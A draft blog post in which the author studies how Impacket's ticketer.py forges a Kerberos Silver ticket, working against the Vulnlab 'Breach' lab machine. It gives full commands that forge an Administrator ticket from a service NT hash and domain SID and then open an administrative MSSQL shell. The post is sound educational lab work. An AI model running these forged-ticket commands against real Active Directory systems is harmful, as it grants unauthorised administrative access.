+++
title = 'Understanding Kerberos - Reverse engineering Silver tickets with Vulnlab-Breach'
date = 2024-10-24T13:20:53+02:00
draft = true
tags = ['kerberos', 'pentesting', 'reverse engineering']
+++

So I'd like to understand Kerberos in more detail, since a lot of Active Directory attacks are based around it.

Since I'm not a person to just read blog articles, I instead decided to do a more hands-on approach: 
Reading the code of [ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py) to understand how 
the creation of a Silver ticket works.

Why Silver Ticket? Well, it's a more narrow and defined goal than just *understanding Kerberos basics* and from my current knowlegde it seems to be the *simplest* attack to analyze:
1. Forging the ticket is completely doable from a linux host
2. I have an easy way to veryfy if I broke something by just running it against a silver ticket challenge.

# Research approach

The main goal is to understand what `ticketer.py` is actually doing with the NT-Hash of a service.
If there is time left, I'd like to see what parts I could feasibly implement myself.

# Lab Setup 

I'm using `ticketer.py` from the Impacket master branch on commit `65b774d`.

First step would be to narrow down the actual code that is responsible for the ticket generation. 
In case I want to modify code, I'm building a nice development environment where I can see my own changes:

```bash
git clone https://github.com/fortra/impacket.git
python -m venv impacket
. impacket/bin/activate
cd impacket/
pip install .
```


## Sanity test
To verify that things work, I just test it against a Vulnlab machine which has a silver ticket: Breach.

The following commands should generate a silver ticket and 
use it to get an administrative mssql shell.

```bash
ticketer.py -nthash '69596C7AA1E8DAEE17F8E78870E25A5C' -domain-sid 'S-1-5-21-2330692793-3312915120-706255856' -domain breach.vl -spn 'MSSQLSvc/breach.vl' Administrator
export KRB5CCNAME="$(pwd)"/Administrator.ccache
mssqlclient.py -k breach.vl -target-ip "$IP"
rm "$KRB5CCNAME"
unset KRB5CCNAME
```
![Sanity check that commands work correctly](/static/images/ticketer.py/sanity_check.png)


# Reverse engineering python

The first idea is to just look up what functions are called:

I use the python module `trace` for that.
```bash
python -m trace --trace $(which ticketer.py) -nthash '69596C7AA1E8DAEE17F8E78870E25A5C' -domain-sid 'S-1-5-21-2330692793-3312915120-706255856' -domain breach.vl -spn 'MSSQLSvc/breach.vl' Administrator > trace.log
```

```
wc -l trace.log
1657586 trace.log
```
1.6 Million lines of python code executed o.O!

Luckily for us the "real code" starts at line 1496314 

![Image showing that the real code starts at line 1496314](/static/images/ticketer.py/start.png). Before is just a bunch of python imports.